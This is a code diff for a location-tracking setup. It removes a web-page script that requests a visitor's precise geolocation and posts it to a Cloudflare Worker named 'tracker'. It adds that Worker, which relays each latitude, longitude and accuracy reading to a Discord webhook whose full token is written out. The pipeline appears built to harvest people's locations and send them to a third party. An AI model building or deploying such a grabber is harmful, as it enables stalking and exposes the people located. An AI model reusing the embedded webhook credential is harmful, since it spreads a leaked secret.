@@ -1,52 +1,21 @@
-<script>
-const WORKER_URL = "https://tracker.jovdat70.workers.dev/"; // Your Cloudflare Worker URL
+addEventListener('fetch', event => {
+  event.respondWith(handleRequest(event.request))
+})
 
-function getLocation() {
-  const statusEl = document.getElementById("status");
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1455587749133422779/Dj7Kic95o6avV_I-m0TzKVXGqmuFuO59X9B3YD4cnfjPlwSRcLHcKrvSX367FJnd9UUP"
 
-  // Check if browser supports geolocation
-  if (!navigator.geolocation) {
-    statusEl.textContent = "Geolocation is not supported by your browser.";
-    return;
+async function handleRequest(request) {
+  try {
+    const data = await request.json()
+    await fetch(WEBHOOK_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        content: `📍 New location\nLat: ${data.lat}\nLon: ${data.lon}\nAccuracy: ±${data.acc}m`
+      })
+    })
+    return new Response(JSON.stringify({status: "ok"}), {status: 200})
+  } catch (err) {
+    return new Response(JSON.stringify({status: "error", message: err.message}), {status: 500})
   }
-
-  statusEl.textContent = "Requesting permission...";
-
-  navigator.geolocation.getCurrentPosition(
-    (position) => {
-      const data = {
-        lat: position.coords.latitude,
-        lon: position.coords.longitude,
-        acc: position.coords.accuracy
-      };
-
-      // Send location to the Worker (which posts to Discord)
-      fetch(WORKER_URL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(data)
-      })
-      .then((res) => {
-        if (res.ok) {
-          statusEl.textContent = "Thanks! Location received successfully.";
-        } else {
-          statusEl.textContent = "Error sending data. Try again.";
-          console.error("Worker response error:", res.status, res.statusText);
-        }
-      })
-      .catch((err) => {
-        statusEl.textContent = "Error sending data.";
-        console.error("Fetch error:", err);
-      });
-    },
-    (err) => {
-      console.error("Geolocation error:", err);
-      if (err.code === 1) statusEl.textContent = "Permission denied.";
-      else if (err.code === 2) statusEl.textContent = "Position unavailable.";
-      else if (err.code === 3) statusEl.textContent = "Timeout.";
-      else statusEl.textContent = "Unknown error.";
-    },
-    { enableHighAccuracy: true, timeout: 10000 }
-  );
 }
-</script>
